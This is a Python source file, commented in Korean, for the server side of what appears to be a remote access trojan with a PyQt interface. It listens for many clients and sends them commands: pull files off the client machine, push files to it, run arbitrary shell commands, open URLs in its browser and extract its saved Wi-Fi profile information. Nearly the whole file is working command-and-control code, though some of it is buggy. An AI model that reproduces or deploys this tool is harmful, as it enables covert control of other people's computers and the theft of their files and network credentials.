from sendrecv import SendRecv
import socket
from datetime import datetime
import sys, os
import time
from gui import Window, Worker
from PyQt5.QtWidgets import QApplication
from queue import Queue
import threading


class Server:
    def __init__(self, ip="0.0.0.0", port=8888):
        self.host_ip = ip # 로컬 테스트시 'localhost', 외부 테스트시 포트포워딩 & '0.0.0.0'
        self.host_port = port
        self.all_connections = {} # 연결된 소켓 저장 dict[ip] = {"controller":controller, "con": connection, "codec"}
        self.cur_con = None
        self.NUMBER_OF_THREADS = 1
        self.JOB_NUMBER = [1]
        self.queue = Queue()

        self.App = QApplication(sys.argv)
        self.window = Window(self)
        # self.create_worker()
        # self.create_jobs()
        # t = threading.Thread(target=self.run)
        # t.daemon = True
        # t.start()
        # worker = Worker(self.run)
        # self.window.threadpool.start(worker)

    def __del__(self):
        for conn in self.all_connections:
            conn.close()
        if self.App.exec() == 0:
            print("정상 종료")

    def create_worker(self):
        for _ in range(self.NUMBER_OF_THREADS):
            t = threading.Thread(target=self.work)
            t.daemon = True
            t.start()

    def work(self):
        while True:
            w = self.queue.get()
            if w == 1:
                self.run()

            self.queue.task_done()

    def create_jobs(self):
        for x in self.JOB_NUMBER:
            self.queue.put(x)
        self.queue.join()


    def run(self, progress_callback):
        """ 소켓을 생성하여 연결한다 """
        try:
            self.window.append_message("안녕안녕안녕")
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((self.host_ip, self.host_port))
            sock.listen(20)
        except socket.error as msg:
            print("소켓 생성 에러 : " + str(msg) + "\n")
            print("10초 후 다시 시도 합니다... \n")
            time.sleep(10)
            self.run()
            return

        print(f"[*] 서버가 시작 됩니다 > {self.host_ip}:{self.host_port} | {datetime.now().strftime('%H:%M:%S')}\n")
        
        while True:
            try:
                conn, address = sock.accept()
                sock.setblocking(1)
                controller = SendRecv(conn)
                self.window.send_message(f"[!]새로운 클라이언트가 연결되었습니다 => [{address[0]}:{str(address[1])}]")
                controller.send(":codec")
                codec = controller.recv().decode("utf-8")
                address = f"{address[0]}:{str([1])}"
                self.all_connections[address] = {"controller":controller, "con": conn, "codec": codec}
                self.refresh()
                print(f"{address} 연결 성공\n")
            except:
                print(f"{address} 연결 실패\n")


    def select_ip(self, target_ip):
        """ 명령을 내릴 연결된 ip를 선택한다 """
        try:
            self.cur_con = self.all_connections[target_ip]
        except:
            print("연결에 실패하였습니다 정보를 갱신하고 있습니다\n")
            return False
        print(f"{target_ip}에 정상적으로 연결되었습니다\n")
        return True

    def refresh(self):
        """ 연결된 클라이언트가 연결되어 있는지 확인&갱신 """
        for key in self.all_connections:
            try:
                controller = self.all_connections[key]["controller"]
                controller.send(str.encode(" "))
                controller.recv(201480) # 연결 확인
            except:
                del self.all_connections[key] # 연결이 끊긴 ip 삭제
                continue

        self.window.listview_update(self.all_connections.keys())
    
    def control(self, command):
        """ 명령어 총괄하는 함수 """
        try:
            if not command.strip():
                return True

            if command == ":help":
                self.window.append_message(help())
            elif ":download" in command:
                self.download(command)
            elif ":upload" in command:
                self.upload(command)
            elif command == ":kill":
                self.cur_con["controller"].send(b":kill")
                self.cur_con["con"].shutdown(2)
                self.cur_con["con"].close()
            elif ":exec" in command:
                command = "".join(command.split(":exec")).strip()
                if not command.strip(): return "사용법 : exec <명령어>\n"
                else:
                    try:
                        os.system(command)
                        return f"[*] :exec {command} 완료\n"
                    except Exception() as e:
                        return e.message+"\n"
            elif command == ":wifi":
                print("[*] 와이파이 프로필 정보를 얻는중...")
                self.cur_con["controller"].send(b":wifi")
                info = self.cur_con["controller"].recv()
                info = info.decode(self.cur_con["codec"])

                if info == ":Error":
                    print("[!] 에러! wifi정보를 클라이언트로부터 받아올수 없습니다")
                else:
                    print("[*] INFO:\n")
                    print(info + "\n")
            elif ":browse" in command:
                self.browse(command)
            elif command.lower() == "cls" or command.lower() == "clear":
                self.window.clear_message()
            else:
                self.cur_con["controller"].send(command.encode(self.cur_con["codec"]))
                data = self.cur_con["controller"].recv()
                if data.strip():
                    print(data.decode(self.cur_con["codec"]))
            return True
        except Exception as e:
            print("[!] 에러가 발생하였습니다 : " + str(e) + "\n")
            return False

    def download(self, filee):
        command = filee
        filee = "".join(filee.split(":download")).strip()

        if filee:
            filetodown = filee.split("/")[-1] if "/" in filee else filee.split("\\")[-1] if "\\" in filee else filee
            self.cur_con["controller"].send(command.encode(self.cur_con["codec"]))
            down = self.cur_con["controller"].recv().decode(self.cur_con["codec"])
            if down == ":True:":
                print(f"[~] 다운로드 중... [{filetodown}]")
                with open(filetodown, "wb") as wf:
                    while True:
                        data = self.cur_con["controller"].recv()
                        if data == b":Done:":
                            print(f"[*] 다운로드가 완료되었습니다.\n [*] 파일 저장 위치 : {os.getcwd() + os.sep + filetodown}\n")
                            break
                        elif data == b":Aborted:":
                            wf.close()
                            os.remove(filetodown)
                            print("[!] 다운로드중 문제가 발생하였습니다.\n다운로드를 종료합니다\n")
                            return
                        wf.write(data)
            else:
                print("사용법 : :download <클라이언트에 있는 다운받을 파일 경로>\n")

    def upload(self, command):
        filetoup = "".join(command.split(":upload")).strip()
        if not filetoup.strip():
            print("사용법 : :upload <로컬에 있는 업로드할 파일 경로>\n")
        else:
            self.cur_con["controller"].send(command.encode(self.cur_con["codec"]))
            print(f"[~] 업로딩 중.. [{filetoup}]\n")
            with open(filetoup, "rb") as rf:
                for data in iter(lambda: rf.read(4100), b""):
                    try:
                        self.cur_con["controller"].send(data)
                    except Exception as e:
                        rf.close()
                        self.cur_con["controller"].send(b":Aborted:")
                        print(f"[!] 업로딩이 중지되었습니다!\n{e}\n")
                        return
            self.cur_con["controller"].send(b":Done:")
            savedpath = self.cur_con["controller"].recv().decode(self.cur_con["codec"])
            print(f"[*] 업로드 완료 :)\n[*]파일 업로드 위치 : {str(savedpath).strip()}\n")

    def browse(self, command):
        url = "".join(command.split(":browse")).strip()
        if not url:
            print("사용법 : :browse <웹 사이트 URL>\n")
        else:
            if not url.startswith(("http://", "https://")):
                url = "http://" + url
            print(f"[~] 브라우저로 {url}을 열었습니다\n")
            self.cur_con["controller"].send(f":browse {url}".encode(self.cur_con["codec"]))
            print("[*] 완료\n")


    def runCMD(self):
        while True:
            pass


    def help(self):
        return """
Commands      Desscription
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
:help         도움메세지를 생성합니다
:download     클라이언트로부터 파일을 다운 받습니다
:upload       클라이언트에 파일을 업로드 합니다
:kill         해당 클라이언트와 연결을 끊습니다
:exec         외부 CLI에 명령을 합니다
:wifi         클라이언트의 wifi 정보를 가져옵니다
:browse       url로 부터 브라우저를 켭니다
cd -          클라이언트의 이전 경로로 이동합니다
cd --         클라이언트와 맨처음에 연결되었던 경로로 이동합니다
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"""

s = Server("0.0.0.0", 8888)